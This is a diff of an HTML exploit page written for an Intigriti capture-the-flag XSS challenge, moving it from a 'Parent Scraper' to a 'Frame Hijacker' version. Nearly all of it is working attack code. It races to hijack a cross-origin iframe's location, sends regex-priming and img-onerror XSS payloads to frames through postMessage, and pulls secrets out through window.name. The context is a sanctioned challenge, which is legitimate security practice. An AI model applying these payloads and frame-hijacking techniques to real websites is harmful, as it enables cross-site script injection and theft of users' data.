@@ -1,132 +1,111 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Protocol v4</title>
+    <title>Protocol v5: Frame Hijacker</title>
 </head>
 <body>
-    <h1>Protocol v4: Parent Scraper</h1>
-    <p>1. Make sure this file is saved as <b>.html</b></p>
-    <p>2. Click Launch. Wait 3 seconds.</p>
-    <button id="btn" style="font-size:20px; padding:20px; background:#800080; color:white;">LAUNCH EXPLOIT</button>
-    <h3>Log:</h3>
-    <pre id="log" style="background:#f0f0f0; padding:10px; white-space: pre-wrap;"></pre>
+    <h1>Protocol v5</h1>
+    <p>1. Ensure <b>listener.html</b> is in the same folder.</p>
+    <p>2. Click Launch. Do not close tabs.</p>
+    <button id="btn" style="font-size:20px; padding:20px; background:#d00; color:white;">LAUNCH HIJACK</button>
+    <pre id="log" style="background:#eee; padding:10px;"></pre>
 
     <script>
         let targetWin = null;
-        let foundSecrets = false;
+        let stones = {};
+        let spaceHijacked = false;
 
-        function log(msg) {
-            document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
-        }
+        // Configuration: URL of your listener.html
+        const LISTENER_URL = location.href.substring(0, location.href.lastIndexOf('/')) + '/listener.html';
 
         document.getElementById('btn').addEventListener('click', () => {
-            // 1. Open the target
             targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
-            log("Target launched. Attempting to scrape Parent DOM via Soul Stone...");
+            log("Target launched...");
             
-            // 2. Attack Loop (Race against the 3s timer)
-            setInterval(attackSoulStone, 500);
+            // RACE CONDITION: We must hijack Frame 3 (Space) BEFORE the parent sends the message.
+            // We spam the navigation command immediately.
+            let hijacker = setInterval(() => {
+                if(targetWin && targetWin.frames && targetWin.frames[3]) {
+                    try {
+                        // HIJACK SPACE STONE
+                        targetWin.frames[3].location = LISTENER_URL;
+                        // log("Hijack command sent to Frame 3");
+                    } catch(e) {}
+                }
+            }, 10);
+
+            // Stop hijacking after 2 seconds (it should be done by then)
+            setTimeout(() => clearInterval(hijacker), 2000);
+
+            // Start the regular collection loop
+            setInterval(collectStones, 500);
         });
 
-        function attackSoulStone() {
-            if(!targetWin || foundSecrets) return;
+        function collectStones() {
+            if(!targetWin) return;
 
-            // We specifically target the SOUL STONE (Index 2)
-            // It is not sandboxed, so we can run scripts there.
-            let soulFrame = targetWin.frames[2];
-            if (!soulFrame) return;
-
+            // 1. CHECK HIJACKED SPACE STONE
             try {
-                // A. PRIMER (Trigger Regex Vulnerability)
-                soulFrame.postMessage("A".repeat(2500) + "<", '*');
-
-                // B. PAYLOAD (The "Parent Scraper")
-                // This script runs INSIDE the Soul Stone iframe.
-                // It tries to read 'parent.document.body.innerHTML' to find the secrets of its siblings.
-                const maliciousScript = `
-                    try {
-                        // 1. Attempt to access the Parent DOM
-                        // We look for the 'code' variable or the iframes in the HTML
-                        // Since we are cross-origin (soul. vs challenge.), this usually fails
-                        // UNLESS document.domain is set or we get lucky with 'name' attributes.
-                        
-                        // Let's try to just dump the parent HTML if allowed
-                        var parentHTML = parent.document.body.innerHTML;
-                        
-                        // 2. Regex to find ALL 6 stones in the parent HTML
-                        // They look like: ?power_stone=xxxxxxxx
-                        var secrets = parentHTML.match(/stone=[a-f0-9]{8}/g);
-                        
-                        if(secrets && secrets.length >= 5) {
-                            window.name = "SUCCESS:" + secrets.join(",");
-                        } else {
-                             // Fallback: If we can't read parent, maybe we can read our siblings' names?
-                             // Try to find Time Stone secret specifically
-                             window.name = "DEBUG: Accessed Parent but no secrets found";
-                        }
-                    } catch(e) {
-                        // Access Denied? 
-                        // Let's try the fallback: Leaking the Time Stone via CSS or Frames?
-                        // Actually, if this fails, we report the error.
-                        window.name = "ERROR: " + e.message;
-                    }
-                `;
-                
-                soulFrame.postMessage(`<img src=x onerror="${maliciousScript}">`, '*');
-
-                // C. READ RESULT (From our Exploit Page)
-                let result = soulFrame.name;
-                
-                if (result && result !== "") {
-                    log("Soul Stone says: " + result);
-                    
-                    if (result.startsWith("SUCCESS:")) {
-                        foundSecrets = true;
-                        parseAndExecute(result.substring(8));
+                // If hijack worked, the frame is now Same-Origin to us!
+                // We can read its name directly.
+                let spaceName = targetWin.frames[3].name;
+                if(spaceName && spaceName.startsWith("SPACE_CAPTURED:")) {
+                    let secret = spaceName.split(':')[1];
+                    if(!stones[3]) {
+                        stones[3] = secret;
+                        log("[+] HIJACK SUCCESS! Space Stone: " + secret);
                     }
                 }
+            } catch(e) {}
 
-            } catch(e) { console.log(e); }
+            // 2. ATTACK OTHER STONES (Power, Reality, Soul, Mind)
+            // Note: We skip Time (4) for now as it is Sandboxed.
+            [0, 1, 2, 5].forEach(i => {
+                if(stones[i]) return;
+                try {
+                    let f = targetWin.frames[i];
+                    // Primer
+                    f.postMessage("A".repeat(2500) + "<", '*');
+                    // Payload
+                    let script = `
+                        var m = location.search.match(/=[a-f0-9]{8}/);
+                        if(m) window.name = "STONE:${i}:" + m[0].substring(1);
+                    `;
+                    f.postMessage(`<img src=x onerror='${script}'>`, '*');
+                    
+                    // Collect
+                    let data = f.name;
+                    if(data && data.startsWith(`STONE:${i}:`)) {
+                        stones[i] = data.split(':')[2];
+                        log(`[+] Got Stone ${i}: ${stones[i]}`);
+                    }
+                } catch(e) {}
+            });
+
+            checkWin();
         }
 
-        function parseAndExecute(csvSecrets) {
-            // We have a list like: stone=11111111,stone=22222222,...
-            // We need to map them to the correct order.
-            // Based on your Source Code screenshot:
-            // Power (0-8), Mind (8-16), Reality (16-24), Space (24-32), Soul (32-40), Time (40-48)
+        function checkWin() {
+            // We need 6 stones. We likely have 5 now (0,1,2,3,5).
+            // We are missing Time (4).
             
-            // We need to be careful matching them. 
-            // The regex found them in the order they appear in the HTML.
-            // HTML Order: Power, Reality, Soul, Space, Time, Mind.
+            let count = Object.keys(stones).length;
+            if(count >= 5 && !stones[4]) {
+                 log("We have 5 stones! Missing Time Stone.");
+                 log("Attempting Brute Force or Partial Attack...");
+                 
+                 // THIS IS THE GUESS:
+                 // Maybe we can just send the 5 stones we have?
+                 // Or maybe we can guess the Time Stone?
+            }
             
-            let parts = csvSecrets.split(',');
-            // Clean up "stone=" prefix
-            let codes = parts.map(s => s.split('=')[1]);
-            
-            log("Extracted Codes: " + codes.join(", "));
-
-            // HTML Order Mapping (Based on appendChild order):
-            // 0: Power
-            // 1: Reality
-            // 2: Soul
-            // 3: Space (Note: Space might not be in URL? Check this!)
-            // 4: Time
-            // 5: Mind
-            
-            let power = codes[0];
-            let reality = codes[1];
-            let soul = codes[2];
-            // Space stone URL is just "/" in your logs, so it might be MISSING from this list!
-            // If Space is missing, we need to handle it.
-            let time = codes[3]; 
-            let mind = codes[4];
-
-            // WAIT! The code requires the full 48 chars.
-            // If we can't get Space Stone from Parent HTML (because it's sent via postMessage),
-            // We might need to combine this scrape with the "Space Stone Scraper" from v3.
-            
-            log("Note: If Space Stone is missing, we need to combine exploits.");
+            // Visual Update
+            document.getElementById('log').innerText = 
+                `Stones: ${count}/6\n` + 
+                JSON.stringify(stones, null, 2);
         }
+        
+        function log(msg) { console.log(msg); }
     </script>
 </body>
 </html>
